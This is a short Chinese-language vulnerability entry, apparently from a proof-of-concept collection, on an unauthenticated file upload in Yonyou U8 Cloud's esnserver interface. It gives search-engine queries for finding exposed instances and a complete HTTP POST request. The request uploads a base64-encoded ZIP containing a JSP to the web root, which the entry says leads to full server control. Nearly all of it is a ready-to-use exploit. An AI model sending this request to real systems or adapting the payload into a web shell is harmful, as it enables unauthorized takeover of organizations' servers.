# 用友U8-Cloud系统接口esnserver存在任意文件上传漏洞
用友U8 cloud前台任意文件上传导致远程命令执行漏洞。未经授权攻击者通过漏洞上传任意文件，最终可以获取服务器权限。

## fofa

```javascript
title=="U8C"
```

## hunter

```javascript
app.name="用友 U8 Cloud"
```

## poc
```plain
POST /service/esnserver HTTP/1.1 
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 
Accept-Encoding: gzip, deflate 
Content-Type: application/x-www-form-urlencoded 
Token: 469ce01522f64366750d1995ca119841 
Content-Length: 583 
 
{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCIxMjM0NTYiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA","p2":"webapps/u8c_web/test123.jsp"},"paramType":["p1:[B","p2:java.lang.String"]} 
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1728923468100-14a051e7-c93c-4c37-9a6f-0782a64222a7.png)

上传文件位置

```plain
/test123.jsp
```



